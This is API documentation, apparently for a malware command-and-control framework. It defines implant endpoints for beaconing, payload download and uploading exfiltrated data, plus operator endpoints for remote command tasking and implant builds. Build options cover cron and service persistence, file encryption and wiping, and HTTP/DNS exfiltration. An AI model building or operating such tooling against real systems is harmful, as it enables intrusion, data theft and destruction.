# API guide

## Endpoints

### GHOST

| Method | Endpoint                     | Purpose                                             | Request                                           | Response                                          |
|--------|------------------------------|-----------------------------------------------------|---------------------------------------------------|---------------------------------------------------|
| `POST` | `/api/v1/ghost/register`     | Register a new GHOST                                | [`Ghost`](#struct-ghost)                          | `String`                                          |
| `POST` | `/api/v1/ghost/heartbeat`    | Main loop that sends status and receives configs    | [`HeartbeatRequest`](#struct-heartbeat-request)   | [`HeartbeatResponse`](#struct-heartbeat-response) |
| `GET`  | `/api/v1/ghost/download/:id` | Payload download                                    | `None`                                            | `Binary file`                                     |
| `POST` | `/api/v1/ghost/upload`       | Exfiltrated data target                             | `Raw bytes`                                       | `String`                                          |

### CHARON

| Method    | Endpoint                          | Purpose                             | Request                                             | Response                          |
|-----------|-----------------------------------|-------------------------------------|-----------------------------------------------------|-----------------------------------|
| `GET`     | `/api/v1/charon/ghosts`           | List all active GHOSTs              | `None`                                              | [`Vec<Ghost>`](#struct-ghost)     |
| `GET`     | `/api/v1/charon/ghosts/:id`       | Get detailed info about a GHOST     | `None`                                              | [`Option<Ghost>`](#struct-ghost)  |
| `POST`    | `/api/v1/charon/ghosts/:id`       | Update GHOST config                 | [`GhostConfig`](#struct-ghost-config)               | [`String`]()                      |
| `GET`     | `/api/v1/charon/ghosts/:id/tasks` | Get all tasks for GHOST with :id    | `None`                                              | [`Vec<Task>`](#struct-task)       |
| `GET`     | `/api/v1/charon/tasks/:id`        | Get task details                    | `None`                                              | [`Option<Task>`](#struct-task)    |
| `POST`    | `/api/v1/charon/ghosts/:id/task`  | Queue a new task for GHOST          | [`TaskRequest`](#struct-task-request)               | `None`                            |
| `POST`    | `/api/v1/charon/ghosts/:id/kill`  | Trigger the killswitch of a GHOST   | `None`                                              | `None`                            |
| `POST`    | `/api/v1/charon/build`            | Trigger a remote GHOST build        | [`GhostBuildRequest`](#struct-ghost-build-request)  | `String` (download path)          |

## Structs

<a id="enum-task-status"></a>
```Rust
enum TaskStatus {   // sent as lowercase string
    Pending,
    Sent,
    Done,
    Failed
}
```

<a id="struct-ghost"></a>
```Rust
struct Ghost {
    pub id: String,             // UUID v7
    pub hostname: String,       // system hostname of machine on which the implant resides
    pub os: String,             // operating system, for now we'll just send correct implant, TODO to automatically detect OS and send correct implant
    pub sleep_interval: Option<i64>,
    pub jitter_percent: Option<i16>,
    pub update_pending: Option<bool>,
    pub last_seen: Option<i64>  // unix timestamp
}
```

<a id="struct-ghost-config"></a>
```Rust
struct GhostConfig {
    pub sleep_interval: i64,
    pub jitter_percent: i16
}
```

<a id="struct-task"></a>
```Rust
struct Task {
    pub id: String,         // UUID v7
    pub command: String,    // exact command to be executed on target system
    pub args: String,       // arguments for the above command
    pub status: TaskStatus,
    pub result: Option<String>
}
```

<a id="struct-heartbeat-request"></a>
```Rust
struct HeartbeatRequest {
    pub id: String,
    pub results: Option<Vec<TaskResult>>
}
```

<a id="struct-task-result"></a>
```Rust
struct TaskResult {
    pub task_id: String,
    pub status: TaskStatus,
    pub output: String
}
```

<a id="struct-heartbeat-response"></a>
```Rust
struct HeartbeatResponse {
    pub sleep_interval: i64,
    pub jitter_percent: i16,
    pub tasks: Option<Vec<TaskDefinition>>
}
```

<a id="struct-task-definition"></a>
```Rust
struct TaskDefinition {
    pub id: String,
    pub command: String,
    pub args: String
}
```

<a id="struct-task-request"></a>
```Rust
struct TaskRequest {
    pub command: String,
    pub args: String
}
```

<a id="struct-ghost-build-request"></a>
```Rust
pub struct GhostBuildRequest {
        pub target_url: String,
        pub target_port: String,
        pub enable_debug: bool,

        // persistence
        pub enable_persistence: bool,
        pub persist_runcontrol: bool,
        pub persist_service: bool,
        pub persist_cron: bool,

        // impact
        pub enable_impact: bool,
        pub impact_encrypt: bool,
        pub impact_wipe: bool,

        // exfiltration
        pub enable_exfil: bool,
        pub exfil_http: bool,
        pub exfil_dns: bool
}
```
